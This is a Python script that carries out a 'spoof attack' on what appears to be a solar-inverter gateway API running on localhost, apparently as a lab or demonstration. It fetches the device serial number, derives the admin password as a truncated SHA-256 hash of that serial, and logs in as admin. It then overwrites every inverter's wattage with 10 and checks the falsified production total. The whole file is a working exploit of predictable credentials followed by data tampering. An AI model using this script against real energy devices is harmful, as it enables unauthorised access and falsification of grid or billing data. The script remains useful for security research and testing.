import requests
import hashlib
from utils.logger import log_message

TARGET = "http://localhost:5000"

def run_spoof_attack():
    # Step 1: Get serial number
    log_message("Starting spoof attack...", level="INFO")
    info = requests.get(f"{TARGET}/info").json()
    serial = info["serial_number"]
    log_message(f"[+] Serial Number: {serial}", level="INFO")

    # Step 2: Derive password from serial
    password = hashlib.sha256(serial.encode()).hexdigest()[:8]
    log_message(f"[+] Derived Password: {password}", level="INFO")

    # Step 3: Log in
    login = requests.post(f"{TARGET}/api/login", json={
        "username": "admin",
        "password": password
    })
    if login.status_code != 200:
        log_message("[-] Login failed", level="ERROR")
        print("[-] Login failed")
        exit()

    token = login.json()["token"]
    headers = {"Authorization": token}
    log_message("[+] Got auth token", level="INFO")

    # Step 4: Get inverter list
    inverters = requests.get(f"{TARGET}/api/v1/production/inverters", headers=headers).json()
    log_message(f"[+] Found {len(inverters)} inverters", level="INFO")

    # Step 5: Tamper with inverter watt values
    for inv in inverters:
        serial = inv["serial"]
        log_message(f"[~] Updating inverter {serial} to 10 watts", level="INFO")
        res = requests.post(f"{TARGET}/api/v1/production/inverters/{serial}",
                            headers=headers,
                            json={"watt": 10})
        log_message(f"Updated inverter {serial}: {res.json()}", level="INFO")

    # Step 6: Verify manipulated total
    prod = requests.get(f"{TARGET}/api/v1/production").json()
    log_message(f"[+] Final wattsNow: {prod['wattsNow']}", level="INFO")
    print(f"[+] Final wattsNow: {prod['wattsNow']}")
